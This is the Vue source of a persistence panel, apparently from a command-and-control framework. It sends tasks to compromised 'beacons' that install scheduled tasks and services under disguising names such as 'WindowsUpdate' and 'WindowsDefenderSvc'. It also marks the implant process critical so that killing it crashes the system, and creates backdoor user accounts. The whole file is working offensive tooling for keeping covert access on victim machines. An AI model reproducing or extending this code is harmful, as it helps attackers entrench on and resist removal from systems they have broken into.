<template>
  <div class="pm">
    <!-- Top bar: beacon selector + mode tabs + refresh -->
    <div class="pm-bar">
      <div v-if="showTargetSelector" class="target-sel">
        <span class="bar-label">Target</span>
        <select v-model="targetId" class="target-select">
          <option value="" disabled>Select beacon</option>
          <option v-for="b in aliveBeacons" :key="b.node_id || b.id" :value="b.node_id || b.id">
            {{ b.hostname || b.computer }} — {{ (b.node_id || b.id).slice(0, 12) }}
          </option>
        </select>
      </div>
      <div class="mode-pills">
        <button v-for="m in modes" :key="m.id" class="mpill" :class="{ active: mode === m.id }" @click="mode = m.id as PersistMode">
          <component :is="m.icon" :size="12" />{{ m.label }}
        </button>
      </div>
      <div class="spacer" />
      <button class="icon-btn" @click="refreshItems" title="Refresh"><RefreshCw :size="14" /></button>
    </div>

    <!-- Form area -->
    <div class="pm-form">
      <!-- Schtask -->
      <template v-if="mode === 'schtask'">
        <div class="frow">
          <div class="fgroup">
            <label>Method</label>
            <select v-model="schtask.method">
              <option value="com">COM API</option>
              <option value="cmd">schtasks.exe</option>
              <option value="reg">Registry</option>
              <option value="rpc">RPC</option>
              <option value="xml">XML</option>
            </select>
          </div>
          <div class="fgroup">
            <label>Task Name</label>
            <input v-model="schtask.taskName" placeholder="e.g. WindowsUpdate" />
          </div>
          <div class="fgroup">
            <label>Schedule</label>
            <select v-model="schtask.scheduleType">
              <option value="ONLOGON">ONLOGON</option>
              <option value="ONSTART">ONSTART</option>
              <option value="MINUTE">MINUTE</option>
              <option value="HOURLY">HOURLY</option>
              <option value="DAILY">DAILY</option>
              <option value="ONCE">ONCE</option>
            </select>
          </div>
          <div class="fgroup" v-if="showInterval">
            <label>Interval</label>
            <input v-model="schtask.interval" placeholder="30" style="width:70px" />
          </div>
          <div class="fgroup" v-if="showTime">
            <label>Start Time</label>
            <input v-model="schtask.time" placeholder="14:30" style="width:80px" />
          </div>
          <button class="submit-btn" :disabled="loading || !targetId" @click="submitSchtask">
            <ShieldPlus :size="13" /> Create Task
          </button>
        </div>
      </template>

      <!-- Service -->
      <template v-else-if="mode === 'service'">
        <div class="frow">
          <div class="fgroup">
            <label>Method</label>
            <select v-model="service.method">
              <option value="sc">sc.exe</option>
              <option value="api">SCM API</option>
              <option value="com">WMI COM</option>
            </select>
          </div>
          <div class="fgroup flex1">
            <label>Service Name</label>
            <input v-model="service.serviceName" placeholder="e.g. WindowsDefenderSvc" />
          </div>
          <div class="fgroup flex2">
            <label>Executable Path <span class="opt">(optional)</span></label>
            <input v-model="service.servicePath" placeholder="leave empty to use current agent path" />
          </div>
          <button class="submit-btn" :disabled="loading || !targetId" @click="submitService">
            <ShieldPlus :size="13" /> Create Service
          </button>
        </div>
      </template>

      <!-- Critical -->
      <template v-else-if="mode === 'critical'">
        <div class="frow align-center">
          <span class="hint">Marking process as critical causes BSOD if killed.</span>
          <button class="submit-btn danger" :disabled="loading || !targetId" @click="submitCritical(true)">Set Critical</button>
          <button class="submit-btn" :disabled="loading || !targetId" @click="submitCritical(false)">Unset Critical</button>
        </div>
      </template>

      <!-- Create User -->
      <template v-else>
        <div class="frow">
          <div class="fgroup">
            <label>Method</label>
            <select v-model="userCreate.method">
              <option value="net">NetAPI</option>
              <option value="cmd">net.exe</option>
              <option value="ps">PowerShell</option>
            </select>
          </div>
          <div class="fgroup">
            <label>Username</label>
            <input v-model="userCreate.username" placeholder="e.g. backupsvc" />
          </div>
          <div class="fgroup">
            <label>Password</label>
            <input v-model="userCreate.password" type="password" placeholder="P@ssw0rd123!" />
          </div>
          <button class="submit-btn" :disabled="loading || !targetId" @click="submitUserCreate">
            <ShieldPlus :size="13" /> Create User
          </button>
        </div>
      </template>
    </div>

    <!-- Task records -->
    <div class="pm-records">
      <div v-if="items.length === 0" class="empty-state">No persistence tasks yet.</div>
      <div v-for="item in items" :key="item.id" class="rec-row">
        <span class="rec-status" :class="item.status" :title="item.status">
          <span class="rec-dot" />
        </span>
        <span class="rec-kind mono">{{ item.kind }}</span>
        <span v-if="showTargetSelector" class="rec-node mono">{{ item.nodeId.slice(0, 12) }}</span>
        <span class="rec-bof mono tx3">{{ item.bofName }}</span>
        <span class="rec-args mono tx3">{{ item.argsText || '—' }}</span>
        <span v-if="item.output || item.error" class="rec-out mono" :class="{ err: item.error }">
          {{ item.error || item.output }}
        </span>
        <button class="rec-del" @click="removeItem(item.id)" title="Remove"><Trash2 :size="12" /></button>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { computed, reactive, ref, watch } from 'vue'
import { ShieldPlus, RefreshCw, Trash2, CalendarClock, Wrench, Skull, UserPlus } from 'lucide-vue-next'
import { useAppStore } from '../stores/app'
import { useToastStore } from '../stores/toast'
import api from '../services/api'
import { auditTaskInput } from '../services/taskAudit'

type PersistMode = 'schtask' | 'service' | 'critical' | 'user'

const props = defineProps<{
  targetId?: string
  initialMode?: PersistMode
}>()

const STORAGE_KEY = 'ghost-persistence-jobs-v2'
const appStore = useAppStore()
const toast = useToastStore()
const loading = ref(false)
const targetId = ref(props.targetId || '')
const mode = ref<PersistMode>(props.initialMode || 'schtask')
const showTargetSelector = computed(() => !props.targetId)

const modes = [
  { id: 'schtask', label: 'Sched Task', icon: CalendarClock },
  { id: 'service', label: 'Service', icon: Wrench },
  { id: 'critical', label: 'Critical', icon: Skull },
  { id: 'user', label: 'Create User', icon: UserPlus },
]

const isAlive = (lastSeen: number) => {
  if (!lastSeen) return false
  return (Date.now() / 1000 - Number(lastSeen)) < 300
}
const aliveBeacons = computed(() => appStore.beacons.filter((b: any) => isAlive(b.last_seen)))

watch(() => props.targetId, v => {
  if (!v) return
  const found = aliveBeacons.value.find((b: any) => (b.node_id || b.id) === v)
  targetId.value = found ? v : ''
})
watch(() => props.initialMode, v => { if (v) mode.value = v })
watch(aliveBeacons, list => {
  if (!list.length) { targetId.value = ''; return }
  if (!list.some((b: any) => (b.node_id || b.id) === targetId.value)) {
    targetId.value = list[0].node_id || list[0].id
  }
}, { immediate: true })

const schtask = reactive({ method: 'com', taskName: '', scheduleType: 'ONLOGON', interval: '30', time: '14:30' })
const service = reactive({ method: 'sc', serviceName: '', servicePath: '' })
const userCreate = reactive({ method: 'net', username: '', password: '' })

const showInterval = computed(() => ['MINUTE', 'HOURLY', 'DAILY'].includes(schtask.scheduleType))
const showTime = computed(() => schtask.scheduleType === 'ONCE')

type PersistItem = {
  id: string; kind: string; nodeId: string; bofName: string
  taskId: string; argsText: string; status: 'pending' | 'success' | 'error'
  output: string; error: string
}
const items = ref<PersistItem[]>([])

const saveItems = () => localStorage.setItem(STORAGE_KEY, JSON.stringify(items.value))
const loadItems = () => {
  try { const raw = localStorage.getItem(STORAGE_KEY); items.value = raw ? JSON.parse(raw) : [] }
  catch { items.value = [] }
}

const encodeBeaconString = (value: string): number[] => {
  const bytes = Array.from(new TextEncoder().encode(value))
  const len = bytes.length + 1
  return [len & 0xff, (len >> 8) & 0xff, ...bytes, 0]
}
const encodeLen16NoNull = (value: string): number[] => {
  const bytes = Array.from(new TextEncoder().encode(value))
  const len = bytes.length
  return [len & 0xff, (len >> 8) & 0xff, ...bytes]
}

const findSchtaskBof = (m: string) => {
  if (m === 'com') return appStore.bofs.find(b => /^schtask_persist_com\b/i.test(b.name))
  if (m === 'reg') return appStore.bofs.find(b => /^schtask_persist_reg\b/i.test(b.name))
  if (m === 'rpc') return appStore.bofs.find(b => /^schtask_persist_rpc\b/i.test(b.name))
  if (m === 'xml') return appStore.bofs.find(b => /^schtask_persist_xml\b/i.test(b.name))
  return appStore.bofs.find(b => /^schtask_persist\b/i.test(b.name) && !/com|reg|rpc|xml/i.test(b.name))
}
const findSvcBof = (m: string) => {
  if (m === 'sc') return appStore.bofs.find(b => /^svc_create_sc\b/i.test(b.name))
  if (m === 'api') return appStore.bofs.find(b => /^svc_create_api\b/i.test(b.name))
  if (m === 'com') return appStore.bofs.find(b => /^svc_create_com\b/i.test(b.name))
  return null
}
const findUserCreateBof = (m: string) => {
  if (m === 'net') return appStore.bofs.find(b => /^user_create_net\b/i.test(b.name))
  if (m === 'cmd') return appStore.bofs.find(b => /^user_create_cmd\b/i.test(b.name))
  if (m === 'ps') return appStore.bofs.find(b => /^user_create_ps\b/i.test(b.name))
  return null
}

const pollTaskResult = async (taskId: string, maxRetry = 120): Promise<any> => {
  for (let i = 0; i < maxRetry; i++) {
    try {
      const res = await api.get(`/tasks/${taskId}`, { silentError: true } as any)
      if (res.data.success && res.data.data) return res.data.data
    } catch (err: any) {
      if (err?.response?.status !== 404) throw err
    }
    await new Promise(resolve => setTimeout(resolve, 1000))
  }
  throw new Error('Task timeout')
}

const queueAndTrack = async (
  kind: string, bofName: string, pluginName: string, argsText: string,
  args?: number[], opts?: { silentToast?: boolean }
) => {
  if (!targetId.value) return
  loading.value = true
  try {
    const payload: any = {
      node_id: targetId.value,
      bof_name: bofName,
      plugin_name: pluginName,
    }
    if (args && args.length) payload.args = args
    await auditTaskInput({ source: `persistence:${kind}`, nodeId: targetId.value, input: argsText || '(none)' })
    const res = await api.post('/bof/execute', payload)
    const taskId = res.data.data
    const entry: PersistItem = {
      id: `${Date.now()}-${Math.random()}`, kind, nodeId: targetId.value,
      bofName, taskId, argsText, status: 'pending', output: '', error: ''
    }
    items.value.unshift(entry)
    saveItems()
    const result = await pollTaskResult(taskId, 120)
    entry.status = result.success ? 'success' : 'error'
    entry.output = result.output || ''
    entry.error = result.error || ''
    saveItems()
    if (!opts?.silentToast) {
      if (result.success) toast.success(`${kind} done`)
      else toast.error(result.error || `${kind} failed`)
    }
    return result
  } catch (err: any) {
    if (!opts?.silentToast) toast.error(err.message || `${kind} failed`)
    return { success: false, output: '', error: err.message || `${kind} failed` }
  } finally {
    loading.value = false
  }
}

const submitSchtask = async () => {
  if (!schtask.taskName.trim()) { toast.error('Task name is required'); return }
  const bof = findSchtaskBof(schtask.method)
  if (!bof) { toast.error('Scheduled-task BOF not found'); return }
  let schedule = schtask.scheduleType
  if (showInterval.value) {
    if (!schtask.interval.trim()) { toast.error('Interval is required'); return }
    schedule += ` /MO ${schtask.interval.trim()}`
  }
  if (showTime.value) {
    if (!schtask.time.trim()) { toast.error('Start time is required'); return }
    schedule += ` /ST ${schtask.time.trim()}`
  }
  const cmdStr = `${schtask.taskName.trim()} ${schedule}`
  await queueAndTrack(`schtask:${schtask.method}`, bof.name, bof.plugin_name || '', cmdStr, encodeBeaconString(cmdStr))
}

const submitService = async () => {
  if (!service.serviceName.trim()) { toast.error('Service name is required'); return }
  const bof = findSvcBof(service.method)
  if (!bof) { toast.error('Service BOF not found'); return }
  const cmdStr = service.servicePath.trim()
    ? `${service.serviceName.trim()} ${service.servicePath.trim()}`
    : service.serviceName.trim()
  await queueAndTrack(`service:${service.method}`, bof.name, bof.plugin_name || '', cmdStr, encodeBeaconString(cmdStr))
}

const submitCritical = async (setFlag: boolean) => {
  const bofName = setFlag ? 'proc_critical_set' : 'proc_critical_unset'
  const bof = appStore.bofs.find(b => new RegExp(`^${bofName}\\b`, 'i').test(b.name))
  if (!bof) { toast.error(`${bofName}.o not found`); return }
  await queueAndTrack(setFlag ? 'critical:set' : 'critical:unset', bof.name, bof.plugin_name || '', '(none)')
}

const submitUserCreate = async () => {
  const username = userCreate.username.trim()
  const password = userCreate.password.trim()
  if (!username) { toast.error('Username is required'); return }
  if (!password) { toast.error('Password is required'); return }
  const bof = findUserCreateBof(userCreate.method)
  if (!bof) { toast.error('User-create BOF not found'); return }
  const masked = `${username} / ${'*'.repeat(Math.min(password.length, 8))}`
  const attempts = [
    { name: 'beacon16-null', args: [...encodeBeaconString(username), ...encodeBeaconString(password)] },
    { name: 'beacon16-no-null', args: [...encodeLen16NoNull(username), ...encodeLen16NoNull(password)] },
    { name: 'single-cmdline', args: encodeBeaconString(`${username} ${password}`) }
  ]
  for (let i = 0; i < attempts.length; i++) {
    const at = attempts[i]
    const result: any = await queueAndTrack(
      `user:${userCreate.method}:${at.name}`, bof.name, bof.plugin_name || '',
      `${masked} [${at.name}]`, at.args,
      { silentToast: i < attempts.length - 1 }
    )
    if (result?.success) { toast.success(`user:${userCreate.method} done`); return }
    const errText = String(result?.error || result?.output || '').toLowerCase()
    const shouldRetry = errText.includes('username required') || errText.includes('invalid') || errText.includes('argument')
    if (!shouldRetry && i < attempts.length - 1) break
  }
  toast.error(`user:${userCreate.method} failed`)
}

const refreshItems = async () => {
  loadItems()
  const pending = items.value.filter(i => i.status === 'pending')
  for (const p of pending) {
    try {
      const r = await pollTaskResult(p.taskId, 1)
      p.status = r.success ? 'success' : 'error'
      p.output = r.output || ''
      p.error = r.error || ''
    } catch { /* keep pending */ }
  }
  saveItems()
}

const removeItem = (id: string) => {
  items.value = items.value.filter(i => i.id !== id)
  saveItems()
}

loadItems()
</script>

<style scoped>
.pm { display: flex; flex-direction: column; height: 100%; background: var(--bg); overflow: hidden; }

/* ── Top bar ── */
.pm-bar {
  display: flex; align-items: center; gap: 10px; padding: 8px 14px;
  border-bottom: 1px solid var(--bd); flex-shrink: 0; flex-wrap: wrap;
}
.bar-label { font-size: 11px; color: var(--tx-3); }
.target-select {
  height: 28px; background: var(--bg-3); border: 1px solid var(--bd);
  color: var(--tx); border-radius: 6px; padding: 0 8px; font-size: 12px;
}
.target-sel { display: flex; align-items: center; gap: 6px; }
.spacer { flex: 1; }
.icon-btn {
  display: inline-flex; align-items: center; justify-content: center;
  width: 28px; height: 28px; border-radius: 6px; border: none;
  background: transparent; color: var(--tx-3); cursor: pointer;
}
.icon-btn:hover { color: var(--tx); background: var(--bg-3); }

/* Mode pills */
.mode-pills { display: flex; gap: 2px; background: var(--bg-3); border-radius: 8px; padding: 3px; }
.mpill {
  display: inline-flex; align-items: center; gap: 5px; border: none;
  background: transparent; color: var(--tx-3); border-radius: 6px;
  padding: 4px 10px; font-size: 11px; cursor: pointer; transition: all .13s;
}
.mpill:hover { color: var(--tx); }
.mpill.active { background: var(--bg-2); color: var(--tx); box-shadow: 0 1px 3px rgba(0,0,0,.15); }

/* ── Form area ── */
.pm-form {
  padding: 10px 14px; border-bottom: 1px solid var(--bd);
  background: var(--bg-2); flex-shrink: 0;
}
.frow { display: flex; align-items: flex-end; gap: 10px; flex-wrap: wrap; }
.frow.align-center { align-items: center; }
.fgroup { display: flex; flex-direction: column; gap: 4px; }
.fgroup.flex1 { flex: 1; min-width: 140px; }
.fgroup.flex2 { flex: 2; min-width: 200px; }
.fgroup label { font-size: 10px; color: var(--tx-3); letter-spacing: .4px; }
.fgroup input, .fgroup select {
  height: 28px; background: var(--bg-3); border: 1px solid var(--bd);
  color: var(--tx); border-radius: 6px; padding: 0 8px; font-size: 12px;
}
.fgroup input:focus, .fgroup select:focus { outline: none; border-color: var(--pri); }
.opt { font-size: 9px; color: var(--tx-4); }
.hint { font-size: 12px; color: var(--tx-3); }

.submit-btn {
  display: inline-flex; align-items: center; gap: 5px; height: 30px;
  padding: 0 12px; border-radius: 6px; border: 1px solid var(--bd);
  background: var(--bg-3); color: var(--tx); font-size: 12px; cursor: pointer;
  transition: background .12s, color .12s; white-space: nowrap; flex-shrink: 0;
}
.submit-btn:hover:not(:disabled) { background: var(--pri); color: #fff; border-color: var(--pri); }
.submit-btn.danger:hover:not(:disabled) { background: var(--red); border-color: var(--red); color: #fff; }
.submit-btn:disabled { opacity: .45; cursor: not-allowed; }

/* ── Records ── */
.pm-records { flex: 1; overflow-y: auto; padding: 6px 14px 14px; }
.empty-state { text-align: center; color: var(--tx-4); padding: 40px 0; font-size: 13px; }

.rec-row {
  display: flex; align-items: center; gap: 8px; padding: 6px 0;
  border-bottom: 1px solid var(--bd); font-size: 11px;
}
.rec-row:last-child { border-bottom: none; }
.rec-status { display: flex; align-items: center; flex-shrink: 0; }
.rec-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--tx-4); }
.rec-status.pending .rec-dot { background: var(--amber); }
.rec-status.success .rec-dot { background: var(--green); }
.rec-status.error .rec-dot { background: var(--red); }

.rec-kind { color: var(--tx); font-weight: 600; flex-shrink: 0; }
.rec-node { color: var(--tx-3); flex-shrink: 0; }
.rec-bof { color: var(--tx-3); flex-shrink: 0; }
.rec-args { color: var(--tx-3); flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.rec-out { color: var(--tx-2); max-width: 280px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex-shrink: 0; }
.rec-out.err { color: var(--red); }
.rec-del { background: transparent; border: none; color: var(--tx-4); cursor: pointer; flex-shrink: 0; padding: 2px; }
.rec-del:hover { color: var(--red); }
.mono { font-family: var(--font-mono, monospace); font-size: 10.5px; }
.tx3 { color: var(--tx-3); }
</style>
